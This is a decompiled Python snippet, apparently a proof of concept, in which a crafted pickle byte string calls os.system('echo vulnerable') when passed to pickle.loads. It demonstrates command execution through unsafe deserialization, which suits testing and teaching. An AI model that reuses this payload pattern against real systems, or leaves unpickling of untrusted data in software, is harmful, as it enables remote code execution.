# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 1093_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 260 bytes
import pickle
data = b"cos\nsystem\n(S'echo vulnerable'\n."
result = pickle.loads(data)

# okay decompiling 1093_1.pyc
